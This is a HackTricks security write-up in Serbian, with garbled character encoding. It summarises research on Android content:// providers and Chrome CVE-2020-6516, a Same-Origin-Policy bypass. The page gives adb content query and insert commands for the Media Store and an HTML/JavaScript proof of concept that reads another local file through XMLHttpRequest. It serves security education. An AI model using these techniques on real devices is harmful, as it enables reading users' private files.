<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>


**Ovo je saÅ¾etak posta [https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/](https://census-labs.com/news/2021/04/14/whatsapp-mitd-remote-exploitation-CVE-2021-24027/)**

### Listanje fajlova u Media Store-u
Da biste izlistali fajlove koje upravlja Media Store, moÅ¾ete koristiti sledeÄ‡u komandu:
```bash
$ content query --uri content://media/external/file
```
Za prikazivanje lako Äitljivog izlaza, prikazujemo samo identifikator i putanju svake indeksirane datoteke:
```bash
$ content query --uri content://media/external/file --projection _id,_data
```
Provajderi sadrÅ¾aja su izolovani u sopstvenom privatnom prostoru imena. Pristup provajderu zahteva odreÄ‘eni `content://` URI. Informacije o putanjama za pristup provajderu mogu se dobiti iz manifesta aplikacije ili izvornog koda Android okvira.

### Pristup Chrome-a provajderima sadrÅ¾aja
Chrome na Androidu moÅ¾e pristupiti provajderima sadrÅ¾aja putem Å¡eme `content://`, Å¡to mu omoguÄ‡ava pristup resursima poput fotografija ili dokumenata izvezenih od strane aplikacija treÄ‡ih lica. Da bismo to ilustrovali, moÅ¾e se umetnuti datoteka u Media Store i zatim pristupiti joj putem Chrome-a:

Umetnite prilagoÄ‘eni unos u Media Store:
```bash
cd /sdcard
echo "Hello, world!" > test.txt
content insert --uri content://media/external/file \
--bind _data:s:/storage/emulated/0/test.txt \
--bind mime_type:s:text/plain
```
Otkrijte identifikator novododatog fajla:
```bash
content query --uri content://media/external/file \
--projection _id,_data | grep test.txt
# Output: Row: 283 _id=747, _data=/storage/emulated/0/test.txt
```
Fajl se moÅ¾e pregledati u Chrome-u koristeÄ‡i URL konstruisan sa identifikatorom fajla.

Na primer, da biste prikazali listu fajlova koji su povezani sa odreÄ‘enom aplikacijom:
```bash
content query --uri content://media/external/file --projection _id,_data | grep -i <app_name>
```
### Chrome CVE-2020-6516: Bypass Same-Origin-Policy

_Same Origin Policy_ (SOP) je sigurnosni protokol u pregledaÄima koji ograniÄava web stranice da komuniciraju sa resursima sa razliÄitih izvora, osim ako to nije eksplicitno dozvoljeno politikom Cross-Origin-Resource-Sharing (CORS). Ova politika ima za cilj spreÄavanje curenja informacija i CSRF napada. Chrome smatra `content://` lokalnom Å¡emom, Å¡to implicira stroÅ¾e SOP pravila, gde se svaki URL lokalne Å¡eme tretira kao zaseban izvor.

MeÄ‘utim, CVE-2020-6516 je bila ranjivost u Chrome-u koja je omoguÄ‡avala zaobilaÅ¾enje SOP pravila za resurse uÄitane putem `content://` URL-a. U suÅ¡tini, JavaScript kod sa `content://` URL-a mogao je pristupiti drugim resursima uÄitanim putem `content://` URL-a, Å¡to je predstavljalo znaÄajan sigurnosni problem, posebno na Android ureÄ‘ajima koji su koristili verzije pre Android 10, gde nije bila implementirana ograniÄena memorija.

Dole je prikazan primer koji demonstrira ovu ranjivost, gde se HTML dokument, nakon Å¡to je otpremljen na **/sdcard** i dodat u Media Store, koristi `XMLHttpRequest` u svom JavaScript kodu da pristupi i prikaÅ¾e sadrÅ¾aj druge datoteke u Media Store-u, zaobilazeÄ‡i SOP pravila.

HTML Primer:
```xml
<html>
<head>
<title>PoC</title>
<script type="text/javascript">
function poc()
{
var xhr = new XMLHttpRequest();

xhr.onreadystatechange = function()
{
if(this.readyState == 4)
{
if(this.status == 200 || this.status == 0)
{
alert(xhr.response);
}
}
}

xhr.open("GET", "content://media/external/file/747");
xhr.send();
}
</script>
</head>
<body onload="poc()"></body>
</html>
```
<details>

<summary><strong>NauÄite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naÄini podrÅ¡ke HackTricks-u:

* Ako Å¾elite da vidite **vaÅ¡u kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRETPLATU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniÄni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), naÅ¡u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **PridruÅ¾ite se** ğŸ’¬ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitter-u** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>
